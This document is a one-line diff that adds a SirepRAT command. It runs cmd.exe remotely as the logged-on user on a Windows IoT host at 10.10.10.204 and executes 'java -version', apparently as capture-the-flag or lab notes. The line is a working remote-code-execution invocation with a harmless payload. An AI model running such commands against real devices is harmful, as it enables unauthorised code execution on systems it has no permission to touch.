@@ -1,0 +1,1 @@
+python SirepRAT.py 10.10.10.204 --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args "/c java -version" LaunchCommandWithOutput
